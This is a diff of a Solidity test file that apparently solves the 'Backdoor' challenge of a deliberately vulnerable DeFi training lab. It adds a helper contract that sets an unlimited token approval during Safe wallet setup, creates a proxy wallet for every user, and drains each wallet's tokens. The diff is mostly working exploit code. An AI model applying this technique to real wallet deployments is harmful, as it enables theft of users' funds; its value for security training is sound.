@@ -8,7 +8,19 @@ import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxie
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
+
+
+
+
+contract BackdoorExploitHelper {
+
+    function setupApprove(address token, address spender) external {
+        IERC20(token).approve(spender, type(uint256).max);
+    }
+}
+
 
 
 contract BackdoorChallenge is Test {
@@ -73,35 +85,51 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
+        // Exploit: The exploit involves creating a proxy wallet for each user,
+        // which allows the attacker to execute arbitrary calls on behalf of the user.
+        // By setting up an unlimited approval for the token transfer, the attacker can
+        // drain the user's wallet without their consent.
 
-        // console.log(token.balanceOf(address(walletRegistry)));
-
-        address[] memory owners = new address[](1);
-        owners[0] = users[0];
-
-
-
-        bytes memory initializer = abi.encodeCall(
-            Safe.setup,
-            (owners, 1, address(0), bytes(""), address(0), address(token), 0, payable(recovery))
+        BackdoorExploitHelper backdoorExploitHelper = new BackdoorExploitHelper();
+    
+        bytes memory data = abi.encodeCall(
+            backdoorExploitHelper.setupApprove,
+            (address(token), player) 
         );
 
-        singletonCopy.setup(
-            owners, 1, address(0), bytes(""), address(0), address(token), 0, payable(recovery)
-        );
+        for (uint i = 0; i < users.length; i++) {
+            
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,            // Array of owners for the Safe wallet
+                    1,                  // Threshold - minimum number of signatures required
+                    address(backdoorExploitHelper), // Address to call during setup (exploit contract)
+                    data,               // Data to be called on the to address
+                    address(0),         // Fallback handler address (none)
+                    address(0),         // Payment token address (none)
+                    0,                  // Payment amount
+                    payable(address(0)) // Payment receiver address (none)
+                )
+            );
 
 
-        walletFactory.createProxyWithCallback(
-            address(singletonCopy), 
-            bytes(""),
-            0,
-            walletRegistry
-        );
+            // Create the proxy wallet for the user, using the wallet registry as the callback
+            walletFactory.createProxyWithCallback(
+                address(singletonCopy), 
+                initializer,
+                0,
+                walletRegistry
+            );
 
-        console.log(token.balanceOf(address(walletRegistry)));
-        // console.log(token.balanceOf(recovery));
-        // handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
-        
+            // Transfer tokens from the user's wallet to the recovery address
+            address wallet = address(walletRegistry.wallets(users[i]));
+            token.transferFrom(address(wallet), recovery, token.balanceOf(address(wallet)));
+        }
+
     }
 
     /**
